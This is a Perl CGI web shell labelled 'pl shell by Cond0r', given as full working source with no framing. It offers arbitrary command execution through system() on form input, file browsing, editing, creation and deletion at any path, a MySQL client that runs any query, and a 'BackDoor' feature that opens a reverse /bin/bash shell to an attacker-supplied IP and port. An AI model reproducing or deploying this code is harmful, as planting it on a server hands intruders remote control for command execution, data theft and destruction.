#!/usr/bin/perl
#use CGI;
#my $query= new CGI;
#print $query->header;
#print "hello people in my head\n";
#printf("hello");
#$a=1;
use strict;
use Cwd;
use CGI;
use DBI;
use Socket; 
use IO::Handle; 

my $file2=new CGI;
my $pro_pth=getcwd;
print "Content-type: text/html\n\n";
print "<html><head><title>pl shell by Cond0r  </title></head>";

print qq(
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
</style>
</head>

<form name="form1" id="form1" action="?action=file" method="post">

<input class="bt"  id="submit" value="File Manage" size="100" type="submit" style="height=20px;width=100px;" />
<input class="input" name="action" value="file" size="100"  type="hidden" >

</form>
<form name="form1" id="form2" action="" method="post">

<input class="bt"  id="submit" value="Cmd Shell" size="100" type="submit" style="height=20px;width=100px;" />
<input class="input" name="action" value="cmd" size="100"  type="hidden" >

</form>	

<form name="form1" id="form2" action="" method="post">

<input class="bt"  id="submit" value="BackDoor" size="100" type="submit" style="height=20px;width=100px;" />
<input class="input" name="action" value="backdoor" size="100"  type="hidden" >


</form>	

<form name="form1" id="form2" action="" method="post">

<input class="bt"  id="submit" value="Create File" size="100" type="submit" style="height=20px;width=100px;" />
<input class="input" name="action" value="create" size="100"  type="hidden" >


</form>	

<form name="form1" id="form2" action="" method="post">

<input class="bt"  id="submit" value="Connect Mysql" size="100" type="submit" style="height=20px;width=100px;" />
<input class="input" name="action" value="mysql" size="100"  type="hidden" >


</form>	

);
#获取
my $mysql_ip = $file2->param("mysql_ip");
my $mysql_quer = $file2->param("mysql_quer");
my $mysql_user = $file2->param("mysql_user");
my $mysql_pass = $file2->param("mysql_pass");
my $mysql_db = $file2->param("mysql_db");
my $mysql_port = $file2->param("mysql_port");
my $cmd=$file2->param("cmd");
my $dir=$file2->param("dir");
my $nul=$file2->param("nn");
my $filename=$file2->param("editfilename");
my $remote_ip=$file2->param("remote_ip");
my $remote_port=$file2->param("remote_port");
my $action=$file2->param("action");
my $filename2=$file2->param("file");
my $con=$file2->param("filecontent");
my $upfilecount = 1;
my $maxuploadcount = 2;
my $basedir = "$pro_pth"; 
my $allowall = "yes"; 
my @theext =(".zip",".exe",".gif"); 
my $file2 = $file2->param("file2");

if($dir)
{
$pro_pth=$dir;
}
if($action eq "cmd")
{
#执行命令
print qq(

<form name="form1" id="form1" action="?action=cmd" method="post">
<h2>Execute Command </h2>

<p>
Command<br><input class="input" name="cmd" value=").$cmd.qq(" size="100" type="text">
<br><input class="input" name="action" value="cmd" size="100"  type="hidden" >
<input class="bt" name="action" id="action" value="cmd" type="submit"></p>
</p>
</form>
);
system($cmd);
#printf $cmd;

} #获取文件夹内容
elsif($action eq "file" or $action eq "")
{
print qq(

<form name="form1" id="form1" action="?action=file" method="post">


<p>
Current Directory <br><input class="input" name="dir" value=").$pro_pth.qq(" size="100" type="text">
<input class="bt"  id="submit" value="View" size="100" type="submit">
<input class="input" name="action" value="file" size="100"  type="hidden" >
</p>
</form>
<tr class="head"></td><td>Filename</td></br>
);



my $some_dir="$dir";

opendir(my $dh, $some_dir) ;
printf qq(<table width="600px" border="0" cellspacing="1" cellpadding="0" >
          <tr style="background-color:silver">
           

          </tr>);
while(my $file=readdir($dh))
{
#$some_dir.$file
my $size=-s $some_dir.$file;
print   qq( <tr style="vertical-align:top">  <td>$file</td>       <td>--</td>       <td>--</td>      </tr>)   if   (-d   $some_dir.$file);
print   qq(<tr style="vertical-align:top"><td>$file</td>            <td><a href="?action=edit&file=$some_dir/$file" >edit</a></td><td><a href="?action=del&file=$some_dir/$file" >del</a></td></tr>)   if   (!-d   $some_dir.$file);

}
	printf qq(</table>);
}
#编辑文件
elsif($action eq "edit")
{
open TXT,"$filename2"; 
my $line;
$line.=<TXT>;
while (<TXT>)
{

$line.=<TXT>;

} 
close TXT;
printf qq(
<form name="form1" id="form1" action="" method="post">
<h2> Read File</h2>
<input class="input" name="editfilename" id="editfilename" value="$filename2" size="100" type="text"></p>
<input class="input" name="action" value="savefile" size="100"  type="hidden" >
<p>File Content<br><textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25">
$line
</textarea></p>
<p><input class="bt" name="submit" id="submit" value="Submit" type="submit"></p>
</form>
);

}#保存编辑文件
elsif($action eq "savefile")
{
my $fil=$filename;
open(FILE,">$fil") || printf "Error";
print FILE "$con";
close(FILE);
printf "OK";
}#删除文件
elsif($action eq "del")
{
unlink $filename2;
printf "ok";
}#反弹
elsif($action eq "backdoor")
{
printf qq(
<form name="form1" id="form1" action="" method="post">
<h2>backdoor</h2>
<h3>remote_ip</h3>
<input class="input" name="action" value="backdoor" size="100"  type="hidden" >
<input class="input" name="remote_ip" id="remote_ip" value="" size="100" type="text"></p>
<h3>remote_port</h3>
<input class="input" name="remote_port" id="remote_port" value="" size="100" type="text"></p>
<p><input class="bt" name="submit" id="submit" value="Submit" type="submit"></p>

);

if($remote_port)
{
#printf "$remote_ip:$remote_port";

my $proto = getprotobyname("tcp"); 
my $pack_addr = sockaddr_in($remote_port, inet_aton($remote_ip)); 

my $shell = '/bin/bash -i'; 

socket(SOCK, AF_INET, SOCK_STREAM, $proto); 

STDOUT->autoflush(1); 
SOCK->autoflush(1); 

connect(SOCK,$pack_addr) or die "can not connect:$!"; 

open STDIN, "<&SOCK"; 
open STDOUT, ">&SOCK"; 
open STDERR, ">&SOCK"; 

print "Enjoy the shell.\n"; 

system($shell); 
close SOCK; 
printf "x3";
}
else
{
printf "X";
}

}
elsif($action eq "create")
{
printf qq(
<form name="form1" id="form1" action="" method="post">
<h2> Read File</h2>
<input class="input" name="editfilename" id="editfilename" value="$pro_pth/new.txt" size="100" type="text"></p>
<input class="input" name="action" value="savefile" size="100"  type="hidden" >
<p>File Content<br><textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25">
</textarea></p>
<p><input class="bt" name="submit" id="submit" value="Submit" type="submit"></p>
</form>
);#创建文件
if($con or $filename)
{
my $fil=$filename;
open(FILE,">$fil") || printf "Error";
print FILE "$con";
close(FILE);
printf "OK";

}
else
{
printf "x";
}

}
elsif($action eq "mysql")
{
my $sql=$mysql_quer;

printf qq(
<table width="600px" border="3" cellspacing="1" cellpadding="0" >
<tr style="background-color:silver">
           

          </tr>
<tr style="vertical-align:top">  <td><h3>Mysql_Helper</h3></td></tr>
<tr style="vertical-align:top">  <td>show databases;</td></tr>
<tr style="vertical-align:top">  <td>show tables;</td></tr>
<tr style="vertical-align:top">  <td>show columns from [table_name];</td></tr>
<tr style="vertical-align:top">  <td>select [coumns_name] from [table_name];</td></tr>
<tr style="vertical-align:top">  <td>update [coumns_name] set [table_name]=[value] where [coumns_name]=[value] ;</td></tr>
</table>
<form name="form1" id="form1" action="" method="post">
<h2>backdoor</h2>
<h5>Host</h5>
<input class="input" name="action" value="mysql" size="100"  type="hidden" >
<input class="input" name="mysql_ip"    value="$mysql_ip" size="50" type="text"></p>
<h5>Port</h5>
<input class="input" name="mysql_port"  value="$mysql_port" size="50" type="text"></p>
<h5>Database</h5>
<input class="input" name="mysql_db"  value="$mysql_db" size="50" type="text"></p>
<h5>User</h5>
<input class="input" name="mysql_user"  value="$mysql_user" size="50" type="text"></p>
<h5>Pass</h5>
<input class="input" name="mysql_pass"  value="$mysql_pass" size="50" type="text"></p>

mysql query<br><textarea class="area"  name="mysql_quer" cols=50" rows="5">
$sql
</textarea></p>

<p><input class="bt" name="submit" id="submit" value="Submit" type="submit"></p>

);

if($mysql_user or $mysql_ip or $mysql_db)
{


my $dbname = $mysql_db;
my $location = $mysql_ip;
my $port =$mysql_port;

my $database = "DBI:mysql:$dbname:$location:$port";

my $db_user = $mysql_user;
my $db_pass =$mysql_pass;
my $dbh = DBI->connect($database,$db_user,$db_pass);


my $sth = $dbh->prepare($sql);

#结果保存在$sth中 

$sth->execute() or die "无法执行SQL语句:$dbh->errstr"; 
my @data;
my $a=0;
printf qq(<table width="600px" border="2" cellspacing="1" cellpadding="0" >
          <tr style="background-color:silver">
           

          </tr>);
while(@data[$a]=$sth->fetchrow_array())
{

printf qq(<tr style="vertical-align:top">  <td>@data[$a]</td></tr>);
$a++;
}


printf qq(</table>);
}
}


